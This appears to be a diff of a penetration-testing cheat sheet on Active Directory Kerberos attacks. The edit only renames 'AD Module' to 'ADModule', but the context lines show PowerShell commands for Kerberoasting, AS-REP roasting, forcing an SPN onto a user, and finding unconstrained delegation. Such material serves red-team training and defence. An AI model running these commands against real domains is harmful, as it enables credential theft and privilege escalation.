@@ -23,7 +23,7 @@ First of all we need to find which users are used as *Service Accounts*:
 ```powershell
 Get-NetUser -SPN
 ```
-* AD Module:
+* ADModule:
 ```powershell
 Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
 ```
@@ -35,7 +35,7 @@ After enum it, we need to request a TGS:
 Request-SPNTicket
 ```
 
-* AD Module:
+* ADModule:
 ```
 Add-Type -AssemblyName System.IdentityModel
 New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/mgmt-user.corp.local"
@@ -77,7 +77,7 @@ We need to enumerate accounts with Kerberos Preauth disabled:
 Get-DomainUser -PreauthNotRequired -Verbose
 ```
 
-* AD Module:
+* ADModule:
 ```powershell
 Get-ADUser -Filter {DoesNotRequiredPreAuth -eq $True} -Properties DoesNotRequiredPreAuth
 ```
@@ -118,7 +118,7 @@ We can also see if a user already has a SPN:
 ```powershell
 Get-DomainUser -Identity user01 | select serviceprincipalname
 ```
-* AD Module:
+* ADModule:
 ```powershell
 Get-ADUser -Identity user01 -Properties ServicePrincipalName | select ServicePrincipalName
 ```
@@ -130,7 +130,7 @@ And we can force the SPN to a user:
 Set-DomainObject -Identity user01 -Set @{serviceprincipalname='ops/whatever01'}
 ```
 
-* AD Module:
+* ADModule:
 ```powershell
 Set-ADUser -Identity user01 -ServicePrincipalNames @{Add='ops/whatever01'}
 ```
@@ -172,7 +172,7 @@ We need to discover computers which have **unconstrained delegation** enabled.
 ```powershell
 Get-NetComputer -UnConstrained
 ```
-* AD Module:
+* ADModule:
 ```powershell
 Get-ADComputer -Filter {TrustedForDelegation -eq $True}
 Get-ADUser -Filter {TrustedForDelegation -eq $True}
